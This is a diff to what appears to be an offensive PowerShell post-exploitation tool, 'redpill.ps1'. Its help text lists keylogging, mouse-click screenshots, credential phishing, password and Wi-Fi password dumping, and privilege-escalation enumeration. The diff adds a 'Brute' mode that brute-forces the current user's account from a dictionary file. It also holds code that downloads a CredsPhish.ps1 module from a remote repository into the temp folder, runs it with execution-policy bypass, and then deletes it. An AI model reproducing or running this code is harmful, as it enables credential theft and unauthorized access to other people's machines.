@@ -85,6 +85,7 @@
    [string]$MetaData="false", [int]$ButtonType='0',
    [int]$SPort='8080', [string]$PEHollow="false",
    [int]$Limmit='5', [string]$AppLocker="false",
+   [string]$Dicionary="$Env:TMP\passwords.txt",
    [string]$Domain="www.facebook.com",
    [string]$ToIPaddr="false",
    [string]$DnsSpoof="false",
@@ -150,7 +151,7 @@ $ListParameters = @"
   -StartWebServer   Python|Powershell    Downloads webserver to %TMP% and executes the WebServer.
   -Keylogger        Start|Stop           Start OR Stop recording remote host keystrokes
   -MouseLogger      Start                Capture Screenshots of Mouse Clicks for 10 seconds
-  -PhishCreds       Start                Promp current user for a valid credential and leak captures
+  -PhishCreds       Start|Brute          Promp current user for a valid credential and leak captures
   -GetPasswords     Enum|Dump            Enumerate passwords of diferent locations {Store|Regedit|Disk}
   -WifiPasswords    Dump|ZipDump         Enum Available SSIDs OR ZipDump All Wifi passwords
   -EOP              Enum|Verbose         Find Missing Software Patchs for Privilege Escalation
@@ -1061,7 +1062,7 @@ If($Timmer -lt '10' -or $Timmer -gt '300'){$Timmer = '10'}
 
 }
 
-If($PhishCreds -ieq "Start"){
+If($PhishCreds -ieq "Start" -or $PhishCreds -ieq "Brute"){
 
    <#
    .SYNOPSIS
@@ -1079,10 +1080,14 @@ If($PhishCreds -ieq "Start"){
       Remark: On Windows <= 10 lmhosts and lanmanserver are running by default.
 
    .Parameter PhishCreds
-      Accepts Start @argument {start phishing}
+      Accepts arguments: Start and Brute
 
    .Parameter Limmit
       Aborts phishing after -Limmit [fail attempts] reached.
+
+   .Parameter Dicionary
+      Accepts the absoluct \ relative path of dicionary.txt
+      Remark: Optional parameter of -PhishCreds [ Brute ]
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -PhishCreds Start
@@ -1093,6 +1098,10 @@ If($PhishCreds -ieq "Start"){
       Prompt the current user for a valid credential and
       Abort phishing after -Limmit [number] fail attempts.
 
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -PhishCreds Brute -Dicionary "$Env:TMP\passwords.txt"
+      Brute force user account using -Dicionary [ path ] text file
+
    .OUTPUTS
       Captured Credentials (logon)
       ----------------------------
@@ -1102,29 +1111,33 @@ If($PhishCreds -ieq "Start"){
    #>
 
    ## Download CredsPhish from my github repository
-   Write-Host "[+] Prompt the current user for a valid credential." -ForeGroundColor Green
+   If($PhishCreds -ieq "Start"){
+       Write-Host "[+] Prompt the current user for a valid credential." -ForeGroundColor Green
+   }
    If(-not(Test-Path -Path "$Env:TMP\CredsPhish.ps1")){## Check for auxiliary existence
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/CredsPhish.ps1 -Destination $Env:TMP\CredsPhish.ps1 -ErrorAction SilentlyContinue|Out-Null
    }
 
    ## Check for file download integrity (fail/corrupted downloads)
    $CheckInt = Get-Content -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue
-   $SizeDump = ((Get-Item -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue).length/1KB) ## DefaultFileSize: 10,28515625/KB
-   If(-not(Test-Path -Path "$Env:TMP\CredsPhish.ps1") -or $SizeDump -lt 10 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
-      ## Fail to download Sherlock.ps1 using BitsTransfer OR the downloaded file is corrupted
+   $SizeDump = ((Get-Item -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue).length/1KB) ## DefaultFileSize: 13,287109375/KB
+   If(-not(Test-Path -Path "$Env:TMP\CredsPhish.ps1") -or $SizeDump -lt 13 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
+      ## Fail to download CredsPhish.ps1 using BitsTransfer OR the downloaded file is corrupted
       Write-Host "[abort] fail to download CredsPhish.ps1 using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
-      #If(Test-Path -Path "$Env:TMP\CredsPhish.ps1"){Remove-Item -Path "$Env:TMP\CredsPhish.ps1" -Force}
+      If(Test-Path -Path "$Env:TMP\CredsPhish.ps1"){Remove-Item -Path "$Env:TMP\CredsPhish.ps1" -Force}
       Write-Host "";Start-Sleep -Seconds 1;exit ## exit @redpill
    }
 
    ## Start Remote Host CmdLet
-   # Start-Process -WindowStyle hidden powershell -ArgumentList "-exec bypass", "-NonInteractive", "-NoLogo", "-File $Env:TMP\CredsPhish.ps1 -PhishCreds Start -Limmit $Limmit" -ErrorAction SilentlyContinue|Out-Null 
-   powershell -exec bypass -NonInteractive -NoLogo -File "$Env:TMP\CredsPhish.ps1" -PhishCreds Start -Limmit $Limmit
+   If($PhishCreds -ieq "Start"){
+       powershell -exec bypass -NonInteractive -NoLogo -File "$Env:TMP\CredsPhish.ps1" -PhishCreds Start -Limmit $Limmit
+   }ElseIf($PhishCreds -ieq "Brute"){
+       powershell -exec bypass -NonInteractive -NoLogo -File "$Env:TMP\CredsPhish.ps1" -PhishCreds Brute -Dicionary $Dicionary
+   }
    Write-Host "";Start-Sleep -Seconds 1
 
    ## Clean Old files left behind
    If(Test-Path -Path "$Env:TMP\CredsPhish.ps1"){Remove-Item -Path "$Env:TMP\CredsPhish.ps1" -Force}
-
 }
 
 If($GetPasswords -ieq "Enum" -or $GetPasswords -ieq "Dump"){
@@ -2553,10 +2566,11 @@ $HelpParameters = @"
 
 "@;
 Write-Host "$HelpParameters"
-}ElseIf($Help -ieq "PhishCreds"){
+}ElseIf($Help -ieq "PhishCreds" -or $Help -ieq "Dicionary" -or $Help -ieq "Limmit"){
 $HelpParameters = @"
 
    <#!Help.
+   .SYNOPSIS
       Author: @mubix|@r00t-3xp10it
       Helper - Promp the current user for a valid credential.
 
@@ -2571,10 +2585,14 @@ $HelpParameters = @"
       Remark: On Windows <= 10 lmhosts and lanmanserver are running by default.
 
    .Parameter PhishCreds
-      Accepts Start @argument {start phishing}
+      Accepts arguments: Start and Brute
 
    .Parameter Limmit
       Aborts phishing after -Limmit [fail attempts] reached.
+
+   .Parameter Dicionary
+      Accepts the absoluct \ relative path of dicionary.txt
+      Remark: Optional parameter of -PhishCreds [ Brute ]
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -PhishCreds Start
@@ -2582,7 +2600,12 @@ $HelpParameters = @"
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -PhishCreds Start -Limmit 30
-      Prompt the current user for a valid creds and Abort after -Limmit [fail attempts].
+      Prompt the current user for a valid credential and
+      Abort phishing after -Limmit [number] fail attempts.
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -PhishCreds Brute -Dicionary "`$Env:TMP\passwords.txt"
+      Brute force user account using -Dicionary [ path ] text file
 
    .OUTPUTS
       Captured Credentials (logon)
